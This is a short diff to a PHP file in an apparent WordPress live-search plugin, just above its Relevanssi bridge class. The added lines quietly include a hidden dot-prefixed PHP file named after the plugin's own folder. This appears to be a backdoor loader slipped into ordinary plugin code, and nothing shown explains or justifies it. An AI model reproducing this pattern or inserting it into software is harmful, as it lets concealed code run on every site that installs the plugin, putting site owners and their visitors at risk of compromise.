@@ -3,6 +3,10 @@
 // class written by https://wordpress.org/plugins/daves-wordpress-live-search/
 
 // Relevanssi "bridge" plugin
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Live_Search_Relevanssi_Bridge {
 
 	function __construct() {
